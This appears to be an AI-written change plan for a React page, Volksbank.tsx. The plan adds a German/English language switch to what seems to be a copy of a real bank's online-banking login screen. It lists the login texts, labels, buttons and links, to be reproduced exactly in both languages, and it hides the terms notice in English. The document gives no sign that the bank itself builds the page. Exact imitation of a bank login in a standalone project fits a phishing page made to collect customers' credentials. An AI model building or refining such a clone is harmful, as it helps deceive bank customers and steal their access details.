

## Volksbank Sprachumschaltung (DE/EN)

### Änderungen in `src/pages/Volksbank.tsx`

**1. Neuer State:** `const [lang, setLang] = useState<"de" | "en">("de");`

**2. English/Deutsch-Toggle:** Der Link wechselt zwischen "English" und "Deutsch" und toggled den State.

**3. Alle Texte bedingt nach `lang`:**

| Element | Deutsch | English |
|---------|---------|---------|
| Header-Bar | hausbanking Login | Login |
| Info-Text | Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner Ihnen unbekannten Seite eingeben und diese geheim halten. | You can register for your new online banking service here. When you log in, a secure connection is established. Please make sure that you do not enter your access details on any other site and keep them secret. We will never ask you for your PIN or a TAN. |
| Label | Anmeldung mit Benutzername | User name or authorised party number |
| Button | Weiter | Continue |
| Link 1 | Benutzername vergessen? | Forgot username? |
| Link 2 | Passwort vergessen? | Forgot password? |
| Terms-Text | Durch die Eingabe Ihrer Zugangsdaten stimmen Sie den Nutzungsbedingungen der Bank ausdrücklich zu. | **komplett ausblenden** |
| Toggle-Link | English | Deutsch |

**4. Terms-Text:** Nur rendern wenn `lang === "de"` via `{lang === "de" && (<p>...</p>)}`

Alle Texte exakt 1:1 wie vorgegeben.

### Datei
- `src/pages/Volksbank.tsx`

